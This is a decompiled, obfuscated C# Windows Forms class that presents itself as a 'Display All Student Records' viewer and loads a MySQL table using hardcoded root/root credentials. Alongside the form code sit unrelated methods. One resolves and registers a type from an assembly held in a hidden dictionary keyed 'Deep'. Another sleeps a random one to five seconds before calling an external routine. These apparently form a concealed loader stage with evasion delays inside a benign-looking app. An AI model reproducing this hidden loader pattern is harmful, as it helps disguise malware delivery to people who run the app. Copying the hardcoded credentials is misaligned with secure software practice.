using System;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Ec7;
using Eo8;
using Microsoft.VisualBasic.CompilerServices;
using Wi84;
using d4G;
using g7J;
using o8G9;

namespace x5X;

[DesignerGenerated]
public class Ts5 : Form
{
	private IContainer components;

	private j6R Connection;

	private Ms8 Command;

	internal DataGridView i;

	public Ts5()
	{
		((Form)this).add_Load((EventHandler)o9C);
		Zk9();
	}

	protected override void g8F(bool w9T)
	{
		try
		{
			if (w9T && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(w9T);
		}
	}

	private void Zk9()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		q5P(new DataGridView());
		((ISupportInitialize)k4N()).BeginInit();
		((Control)this).SuspendLayout();
		k4N().set_AllowUserToAddRows(false);
		k4N().set_AllowUserToDeleteRows(false);
		k4N().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)6);
		k4N().set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
		k4N().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		k4N().set_GridColor(SystemColors.ControlLight);
		((Control)k4N()).set_Location(new Point(12, 12));
		((Control)k4N()).set_Name("DataGridView1");
		k4N().set_ReadOnly(true);
		((Control)k4N()).set_Size(new Size(630, 220));
		((Control)k4N()).set_TabIndex(0);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(669, 261));
		((Control)this).get_Controls().Add((Control)(object)k4N());
		((Control)this).set_Name("Form5");
		((Form)this).set_Text("Display All Student Records");
		((ISupportInitialize)k4N()).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual DataGridView k4N()
	{
		return i;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q5P(DataGridView s7H)
	{
		DataGridView val = (i = s7H);
	}

	private void o9C(object sender, EventArgs e)
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		Connection = new j6R();
		Connection.Jq8("server=localhost;userid=root;password=root;database=student;");
		Tw3 tw = new Tw3();
		DataTable dataTable = new DataTable();
		BindingSource val = new BindingSource();
		try
		{
			Connection.f1N();
			Command = new Ms8();
			tw.Wj1(Command);
			tw.Gg4(dataTable);
			val.set_DataSource((object)dataTable);
			k4N().set_DataSource((object)val);
			tw.Yr2(dataTable);
			k4N().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)6);
			Connection.Dt5();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Connection.g5Z();
		}
	}

	internal static bool Jk9()
	{
		try
		{
			try
			{
				Type type = f2W9.s7S1((Assembly)p1RD.mDic["Deep"]);
				if (Operators.CompareString(type.Name, p1RD.mDic[p1RD.tName].ToString(), false) == 0)
				{
					p1RD.mDic.Add(p1RD.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	internal static void d9D(string a2Z)
	{
		Task.Delay(new Random().Next(1000, 5000)).Wait();
		Bf2.e3B(a2Z);
	}
}
